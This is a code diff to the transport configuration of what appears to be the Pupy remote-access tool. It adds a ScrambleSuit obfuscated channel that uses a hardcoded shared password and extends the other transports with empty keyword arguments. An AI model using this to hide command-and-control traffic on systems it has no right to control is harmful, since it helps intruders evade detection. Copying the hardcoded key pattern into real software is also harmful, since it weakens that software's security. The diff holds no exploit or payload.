@@ -5,6 +5,7 @@ from .servers import PupyTCPServer
 from .clients import PupyTCPClient, PupySSLClient
 from .transports import dummy, b64
 from .transports.obfs3 import obfs3
+from .transports.scramblesuit import scramblesuit
 from .streams import PupySocketStream
 import os
 import logging
@@ -21,6 +22,9 @@ def ssl_authenticator():
 	config.read("pupy.conf")
 	return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")
 
+#scramblesuit password must be 20 char
+scramblesuit_passwd="th!s_iS_pupy_sct_k3y"
+
 transports={
 	"tcp_ssl" : {
 		"server" : PupyTCPServer,
@@ -30,6 +34,8 @@ transports={
 		"stream": PupySocketStream ,
 		"client_transport" : dummy.DummyPupyTransport,
 		"server_transport" : dummy.DummyPupyTransport,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
 	},
 	"tcp_cleartext" : {
 		"server" : PupyTCPServer,
@@ -39,6 +45,8 @@ transports={
 		"stream": PupySocketStream ,
 		"client_transport" : dummy.DummyPupyTransport,
 		"server_transport" : dummy.DummyPupyTransport,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
 	},
 	"tcp_base64" : {
 		"server" : PupyTCPServer,
@@ -48,6 +56,8 @@ transports={
 		"stream": PupySocketStream ,
 		"client_transport" : b64.B64Client,
 		"server_transport" : b64.B64Server,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
 	},
 	"obfs3" : {
 		"server" : PupyTCPServer,
@@ -57,5 +67,18 @@ transports={
 		"stream": PupySocketStream ,
 		"client_transport" : obfs3.Obfs3Client,
 		"server_transport" : obfs3.Obfs3Server,
+		"client_transport_kwargs": {},
+		"server_transport_kwargs": {},
+	},
+	"scramblesuit" : {
+		"server" : PupyTCPServer,
+		"client": PupyTCPClient,
+		"client_kwargs" : {},
+		"authenticator" : None,
+		"stream": PupySocketStream ,
+		"client_transport" : scramblesuit.ScrambleSuitClient,
+		"server_transport" : scramblesuit.ScrambleSuitServer,
+		"client_transport_kwargs": {"password":scramblesuit_passwd}, 
+		"server_transport_kwargs": {"password":scramblesuit_passwd},
 	},
 }
